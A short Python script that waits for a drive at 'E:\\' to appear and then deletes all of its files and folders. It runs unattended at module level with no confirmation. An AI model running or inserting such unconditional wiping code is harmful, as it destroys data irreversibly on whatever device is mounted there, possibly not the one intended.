import os
import shutil
import time
def wipe_pendrive(drive_path):
    if not os.path.exists(drive_path):
        return False
    for item in os.listdir(drive_path):
        item_path = os.path.join(drive_path, item)
        if os.path.isfile(item_path) or os.path.islink(item_path):
            os.remove(item_path)
        elif os.path.isdir(item_path):
            shutil.rmtree(item_path)
    return True
def monitor_and_wipe(drive_path, interval=10):
    while True:
        if os.path.exists(drive_path):
            success = wipe_pendrive(drive_path)
            if success:
                break
        time.sleep(interval)
monitor_and_wipe("E:\\", interval=10)